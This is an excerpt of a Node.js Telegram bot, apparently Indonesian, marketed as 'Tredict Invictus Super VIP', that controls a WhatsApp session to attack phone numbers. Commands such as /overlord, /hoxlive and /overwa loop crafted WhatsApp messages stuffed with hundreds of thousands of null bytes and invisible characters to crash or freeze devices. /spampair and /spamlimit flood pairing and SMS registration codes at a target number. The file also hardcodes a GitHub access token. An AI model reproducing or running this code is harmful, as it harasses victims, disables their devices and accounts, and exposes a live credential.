...
const OWNER = "xatanical";
const REPO = "clover";
const TOKEN_FILE = "invisible.json";
const GITHUB_TOKEN = "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";
...
const thumbnailUrl = "https://files.catbox.moe/rk33b5.jpg";
...
if (!groupOnly(ctx)) return;
  ...
  const loadingTexts = [
    ...
    "👋 *Selamat Datang di...*",
    "",
    "🔥 *Tredict Invictus Super Vip* 🔥",
    "",
    "👑 Owners: Xatanicvxii",
    "Akses Menu Supervip Dibuka"
  ];
...
if (!groupOnly(ctx)) return;
  try {
    ...
    const menuCaption = `<blockquote expandable>
⟣ T R E D I C T  I N V I C T U S ⟢
     S U P E R V I P A K S E S

👑 OWNER : @Xatanicvxii
💮 PARTNER :  Bella

📜 SYSTEM • UPDATE
⟣⟢ AutoUpdate Script Upgrade
⟣⟢ Zero‑Delay Engine

🛡️SECURITY • CORE
⟣⟢ Adaptive Anti‑Bypass
⟣⟢ Proxy Anomaly Sentinel
⟣⟢ Runtime Self‑Lock Protocol
⟣⟢ Token Integrity Quantum
⟣⟢ Encrypted Stealth

🌐 Xatanical Cloud Network
⟣⟢ Status : ONLINE • OPTIMAL</blockquote>`;
...
📜 SYSTEM • UPDATE
⟣⟢ Autonomous Script Upgrade
⟣⟢ Zero‑Delay Sync Engine
...
• /destiny → Murbug Free Spam
• /overlord → Delay Murbug Spam
• /enginer → Hard Spam Delay
• /overwa → Spam Froce Murbug
• /creodash → Force Delete
• /croserd → 1Message Force
• /hoxlive → Invisible iPhone Crash
• /spampair → Spam Code
• /spamlimit → Limit Code
...
<b>🐰 Gold Execute Engine Started…</b>
    ...
    const msgId = sendMsg.message_id;
    let sendCount = 0;
while (bugIntervals[target]) {
  for (let p = 0; p <= 100 && bugIntervals[target]; p++) {
    console.log(chalk.blue(`⏳ Progress: ${p}%`));
    const slowProgress = 15 + Math.floor(Math.random() * 25);
    await new Promise(res => setTimeout(res, slowProgress));
  }

  if (!bugIntervals[target]) break;
  await new Promise(res =>
    setTimeout(res, 150 + Math.floor(Math.random() * 200))
  );
  await InvisibleIphone(target);
    await InvisibleIphone(target);
  sendCount++;
  if (sendCount % 1 === 0) {
    console.log(chalk.yellow("⏸ Tredict Invictus Send Bug"));
    await new Promise(res => setTimeout(res, 1500));
  }
  const extraDelay = 400 + Math.floor(Math.random() * 400);
...
bot.command(
  ...
  async (ctx) => {
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /enginer 62xxxx");
...
<b>🐰 Gold Execute Engine Started…</b>
    ...
    const msgId = sendMsg.message_id;
    for (let i = 0; i < 20; i++) {
    await infinityBug(target);
      await XmagicMachine(target);
      await aviciList(sock, target);
      await infinityBug(target);
      await XmagicMachine(target);
      await aviciList(sock, target);
      await XmagicMachine(target);
...
bot.command(
  ...
  async (ctx) => {
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /overlord 62xxxx");
...
bot.command(
  ...
  async (ctx) => {
    ...
    if (!args) {
      return ctx.reply(
        "Format: /spampair 62xxxx|jumlah\nContoh: /spampair 62888xxxx|99999"
      );
    }

    let [targetNumber, amount = "99999"] = args.split("|");
...
<b>⟢ Target :</b> ${targetNumber}
<b>⟢ Mode :</b> Spam Pairing
<b>⟢ Status :</b> <i>Running…</i>

<b>🐰 Golden Pairing Engine Started…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
    ...
    try {
      ...
      let { state } = await useMultiFileAuthState("XATABAIL");
      ...
      while (bugIntervals[target]) {
        ...
        // === Eksekusi Pairing ===
        try {
          let pairingCode = await sock.requestPairingCode(targetNumber);
          console.log(
            chalk.green(
              `✔ Spam Pairing -> ${targetNumber} | CODE: ${pairingCode}`
            )
          );
        } catch (e) {
          console.log(chalk.red("❌ Gagal Request Pairing Code"));
        }

        sendCount++;
        if (sendCount % 5 === 0) {
          console.log(chalk.yellow("⏸ Tredict Invictus Cooldown"));
          await new Promise((res) => setTimeout(res, 1500));
        }
        ...
        if (sendCount >= parseInt(amount)) break;
      }
    } catch (error) {
      console.error(error);
      ctx.reply("❌ Error internal saat menjalankan Spam Pairing.");
    }
    activeBugs = activeBugs.filter((t) => t !== target);
    delete bugIntervals[target];
    delete bugMeta[target];
...
<b>🐰 Blue Rose Pairing Complete.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
...
bot.command(
  ...
  async (ctx) => {
    if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;
    if (!menuEnabled) return ctx.reply("⚠️ Script dimatikan.");
    if (!tokenValidated) return;

    const commandName = "/spamlimit";
    const userId = ctx.from.id;
    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";
    ...
    const args = ctx.message.text.split(" ")[1];
    if (!args) return ctx.reply("Format: /spamlimit NOMOR|JUMLAH");

    let [nomor, jumlah = "30"] = args.split("|");
    if (!nomor) return ctx.reply("Format salah.");
    ...
    const detectCountry = (number) => {
      ...
      for (let len = 3; len > 0; len--) {
        const cc = number.slice(0, len);
        if (countries.includes(cc)) return cc;
      }
      return number.slice(0, 2);
    };

    const countryCode = detectCountry(nomor);
    const nationalNumber = nomor.replace(countryCode, "");
...
<b>⟢ Target :</b> +${target}
<b>⟢ Negara :</b> +${countryCode}
<b>⟢ Mode :</b> Spam Limit WA
<b>⟢ Status :</b> <i>Running…</i>

<b>🔥 Limit Flood Activated…</b>
      `,
      parse_mode: "HTML",
      reply_markup: {
    ...
    const { state } = await useMultiFileAuthState("XATABAIL"); //GAUSAH GANTI
    const { version } = await fetchLatestBaileysVersion();
    ...
    const randomMCC = () => {
      const mccList = ["310","404","510","724","234","250","505","602","404"];
      return mccList[Math.floor(Math.random() * mccList.length)];
    };
    const spamRegister = async () => {
      try {
        await sock.requestRegistrationCode({
          phoneNumber: target,
          phoneNumberCountryCode: countryCode,
          phoneNumberNationalNumber: nationalNumber,
          phoneNumberMobileCountryCode: randomMCC(),
          method: "sms"
        });
      } catch {}
    };
...
<b>🌑 Universal WhatsApp Limit Attack Completed.</b>
      `,
      {
        parse_mode: "HTML",
        reply_markup: {
...
bot.command(
  ...
  async (ctx) => {
    ...
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("Format: /overwa 62xxxx");
...
while (bugIntervals[target]) {
  ...
  await stickerDelay(sock, target, true);
  sendCount++;
  if (sendCount % 5 === 0) {
    console.log(chalk.yellow("⏸ Tredict Invictus Send Bug"));
    await new Promise(res => setTimeout(res, 1500));
...
bot.command("pullupdate", async (ctx) => {
  try {
    ...
    if (!res.ok) return ctx.reply("❌ Tidak dapat mengakses owner.");
...
bot.command("cekweb", async (ctx) => {
  ...
  try {
    ...
    if (status >= 300 && status < 400) {
      risiko.push("⚠️ Website melakukan redirect (kemungkinan cloaking/phishing).");
    }

    // 3. Cek kata kunci mencurigakan
    const lowerHtml = html.toLowerCase();
    const keywordPhishing = ["login", "bank", "password", "paypal", "verification", "update info", "credential"];
    const keywordHack = ["hack", "steal", "keylogger", "token", "grabber"];

    if (keywordPhishing.some((w) => lowerHtml.includes(w)))
      risiko.push("❌ Mengandung elemen phishing atau permintaan data sensitif.");
    ...
    $("script").each((i, el) => {
      ...
      if (src && /(tracking|ads|click|spy)/i.test(src)) {
        scripts.push(src);
      }
    });
    if (scripts.length > 0) {
...
async function FooterText(target, mention) {
                    ...
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "HINDIABELANDA" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
...
async function infinityBug(target) {
  try {
    const dewa = "\u2063".repeat(5000);
    const vortex = "\u300B".repeat(5000);    
...
const msgxay = {
  ...
  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Xataa", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
  ...
  const statusMessages = [stickerMsg, interMsg, msgxay]
          ...
          contextInfo: {
            ...
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "vortex@newsletter",
                newsletterName:
                  "?¿" + "ꦾ".repeat(10000),
                caption:
                  "?¿" +
    ...
    const msg4 = {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Tredict Invictus" + "ꦽ".repeat(3000),
                            format: "DEFAULT",
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "13135550002@s.whatsapp.net",
                            nativeFlowResponseMessage: [
                                { name: "call_permission_request", paramsJson: "\u0000".repeat(10000) },
                                { name: "delete_chat_request", paramsJson: "\u0000".repeat(4000) },
                                { name: "video_call_request", paramsJson: "\u0000".repeat(20000) },
                                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(5000) + dewa },
                                { name: "galaxy_message", paramsJson: "\u0000".repeat(93000) }
                            ]
                        }
                    },
                    version: 3,
    ...
    for (const msg of [msg1, msg2, msg3, msg4]) {  
      ...
      console.log(`Delay Infinity ${target}`);  
    }
...
async function aviciList(sock, target, mention) {
  ...
  // kirim pesan hanya 1x, tanpa while(true)
...
async function privatedelay(index = 0) {
  ...
  if ((index + 1) % 50 === 0) {
    const longDelay = 3 * 60 * 1000; 
    await new Promise(res => setTimeout(res, longDelay));
  }
  if ((index + 1) % 200 === 0) {
    const ultraDelay = 7 * 60 * 1000;
    await new Promise(res => setTimeout(res, ultraDelay));
  }
}
